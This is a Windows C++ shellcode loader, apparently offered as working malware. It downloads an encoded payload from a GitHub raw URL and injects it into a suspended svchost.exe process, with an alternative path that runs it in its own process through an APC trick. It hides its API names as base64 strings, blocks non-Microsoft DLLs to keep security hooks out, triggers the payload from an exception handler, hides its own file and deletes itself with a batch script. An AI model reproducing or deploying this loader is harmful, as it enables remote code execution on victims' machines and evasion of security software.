#include<Windows.h>
#include<stdio.h>
#include<iostream>
#include<shlwapi.h>
#include<fstream>
#include<shlobj_core.h>
#pragma comment(lib,"Shlwapi.lib")
#include"DynamicMethods.h"
#include"base64.h"
#include"HttpUtils.h"
#include"common.h"



using namespace std;

#pragma warning(disable : 4996)
#ifndef _DEBUG
#pragma comment( linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#pragma comment(linker,"/INCREMENTAL:NO")
#endif

char virtualProtectBase64[] = "VmlydHVhbFByb3RlY3Q=";
char addVectoredExceptionHandlerBase64[] = "QWRkVmVjdG9yZWRFeGNlcHRpb25IYW5kbGVy";
char createProcessWBase64[] = "Q3JlYXRlUHJvY2Vzc0E=";
char writeProcessMemoryBase64[] = "V3JpdGVQcm9jZXNzTWVtb3J5";
char getThreadContextBase64[] = "R2V0VGhyZWFkQ29udGV4dA==";
char resumeThreadBase64[] = "UmVzdW1lVGhyZWFk";
char svchostPathBase64[] = "QzpcV2luZG93c1xTeXN0ZW0zMlxzdmNob3N0LmV4ZQ==";
char queueUserApcBase64[] = "UXVldWVVc2VyQVBD";
char ntTestAlertBase64[] = "TnRUZXN0QWxlcnQ=";
unsigned long long llcode = 0xCC; // INT3




// #pragma comment(linker, "/section:.data,RWE") //数据段可读可写
#ifdef RWX
//新建ldata段

#pragma data_seg("ldata")
unsigned char shellcode[1024];
#pragma data_seg()
#pragma comment(linker,"/SECTION:ldata,RWE")
#endif

#ifndef RWX
unsigned char shellcode[1024];
#endif
void DestoryAfterRun()
{
    char buf[MAX_PATH];
    SHGetSpecialFolderPathA(0, buf, CSIDL_TEMPLATES, false);
    strcat(buf, "\\a.bat");
    fstream file;
    DeleteFileA(buf);
    file.open(buf, ios::out);
    string data = string(":startExe\r\nif not exist ") + _pgmptr + " goto done\r\ndel /f /q " + _pgmptr + "\r\ngoto startExe\r\n:done\r\ndel /f /q %0";
    file.write(data.data(), data.size());
    file.close();
    ShellExecuteA(NULL, "open", buf, NULL, NULL, SW_HIDE);
}


void InjectShellcodeIntoSvchost()
{
    string resp = Base64::decode(string(HttpGet("raw.githubusercontent.com", "/ClankySun10936/Dimples1337/main/update.txt")));
    HexStrToByte(resp.c_str(), shellcode, resp.length());
    CreateProcessAT pCreateProcessA = (CreateProcessAT)GetProcAddress(LoadLibrary(TEXT("KERNEL32.dll")), Base64::decode(createProcessWBase64).c_str());
    WriteProcessMemoryT pWriteProcessMemory = (WriteProcessMemoryT)GetProcAddress(LoadLibrary(TEXT("KERNEL32.dll")), Base64::decode(writeProcessMemoryBase64).c_str());
    GetThreadContextT pGetThreadContext = (GetThreadContextT)GetProcAddress(LoadLibrary(TEXT("KERNEL32.dll")), Base64::decode(getThreadContextBase64).c_str());
    ResumeThreadT pResumeThread = (ResumeThreadT)GetProcAddress(LoadLibrary(TEXT("KERNEL32.dll")), Base64::decode(resumeThreadBase64).c_str());
    STARTUPINFOEXA si = {};
    PROCESS_INFORMATION ProcessInfo = { 0 };
    si.StartupInfo.cb = sizeof(STARTUPINFO);
    memset(&ProcessInfo, 0, sizeof(PROCESS_INFORMATION));
    SIZE_T attributeSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    LPPROC_THREAD_ATTRIBUTE_LIST attributes = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeSize);
    InitializeProcThreadAttributeList(attributes, 1, 0, &attributeSize);
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(attributes, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
    si.lpAttributeList = attributes;
    pCreateProcessA(Base64::decode(svchostPathBase64).c_str(), NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &ProcessInfo);
    CONTEXT context;
    context.ContextFlags = CONTEXT_ALL;
    pGetThreadContext(ProcessInfo.hThread, &context);
    pWriteProcessMemory(ProcessInfo.hProcess, (LPVOID)context.Eax, shellcode, sizeof(shellcode), 0);
    pResumeThread(ProcessInfo.hThread);
    HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, attributes);
    DestoryAfterRun();
}


using pNtTestAlert = NTSTATUS(NTAPI*)();
void InjectShellcodeIntoSelfProcess()
{
    llcode = 0xF333333333333333;
    string shellcodeBase64 = string(HttpGet("raw.githubusercontent.com", "/ClankySun10936/Dimples1337/main/update.txt"));
    string shellcodeString = Base64::decode(shellcodeBase64);
    HexStrToByte(shellcodeString.c_str(), shellcode, shellcodeString.length());
    DWORD olPt = 0;
    VirtualProtectT pVirtualProtect = (VirtualProtectT)GetProcAddress(LoadLibrary(TEXT("KERNEL32.dll")), Base64::decode(virtualProtectBase64).c_str());
    pVirtualProtect(&llcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &olPt);
    char* data = (char*)&llcode;
    CopyMemory(&llcode, shellcode, sizeof(shellcode));
    pNtTestAlert NtTestAlert = (pNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)data;
    QueueUserAPCT pQueueUserAPC = (QueueUserAPCT)GetProcAddress(LoadLibrary(TEXT("KERNEL32.dll")), Base64::decode(queueUserApcBase64).c_str());
    pQueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
    NtTestAlert();
    pVirtualProtect(&llcode, sizeof(shellcode), PAGE_READWRITE, &olPt);
    /*__asm {
        call data;
    }*/
}

long __stdcall ExceptionHandle(PEXCEPTION_POINTERS val)
{

    InjectShellcodeIntoSvchost();
    return 0;
}

//#pragma optimize("",off)
int main()
{
    SetFileAttributes(_wpgmptr, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
    sp.MicrosoftSignedOnly = true;
    SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));

#ifdef _DEBUG
    ExceptionHandle(NULL);
#endif // _DEBUG
#ifndef _DEBUG
    AddVectoredExceptionHandlerT pAddVectoredExceptionHandler = (AddVectoredExceptionHandlerT)GetProcAddress(LoadLibrary(TEXT("KERNEL32.dll")), Base64::decode(addVectoredExceptionHandlerBase64).c_str());
    pAddVectoredExceptionHandler(1, ExceptionHandle);
    __asm {
        int 3;
    }
    llcode = llcode << 2;
#endif

}
//#pragma optimize("",on)

